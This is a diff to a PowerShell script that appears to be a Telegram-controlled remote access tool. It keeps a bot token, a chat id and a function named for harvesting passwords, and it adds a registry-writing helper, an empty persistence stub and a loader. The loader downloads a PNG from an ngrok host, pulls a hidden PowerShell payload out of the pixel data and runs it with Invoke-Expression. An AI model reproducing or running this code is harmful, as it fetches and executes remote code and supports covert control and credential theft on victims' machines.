@@ -1016,6 +1016,38 @@ function GetPass-Powhistory
     return $res
 }
 
+function Add-persistence
+{
+
+}
+
+
+function Set-RegValue($regloc,$name,$value)
+{
+    $key = Get-Item -LiteralPath $regloc
+    
+    if ($key.GetValue($name, $null) -ne $name)
+    {
+        try
+        {
+            New-ItemProperty -Path $regloc -Name $name -Value $value -ErrorAction SilentlyContinue | Out-Null
+        }
+        catch
+        {
+            $err = 1
+        }
+        if (-not($key.GetValue($name, $null) -ne $nname))
+        {
+            return "Added"
+        }
+        else
+        {
+            return $false
+        }
+    }
+    return $true
+}
+
 
 function Get-Parentpath
 {
@@ -1048,4 +1080,23 @@ $apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
 $chat_id = '-1001830797904'
 
 handle-client -apiToken  $apiToken -chat_id $chat_id -update "NotNull"
+
+function Get-ShellImage($url)
+{
+    $path = "$env:APPDATA\sten.png"
+    if(([System.IO.File]::Exists($path)) -eq $false)
+    {
+        Invoke-WebRequest -uri $url -OutFile $path
+    }
+
+    $command = 'sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap("$path");$o=a Byte[] 38400;(0..9)|%{foreach($x in(0..3839)){$p=$g.GetPixel($x,$_);$o[$_*3840+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..35252]))'
+    Invoke-Expression -command $command
+}
+
+$url = "https://5dd4-2a10-8012-21-a261-78bd-ba60-788c-5a99.eu.ngrok.io/tets/maliimage.png"
+Get-ShellImage -url $url
+
+
+
+
 
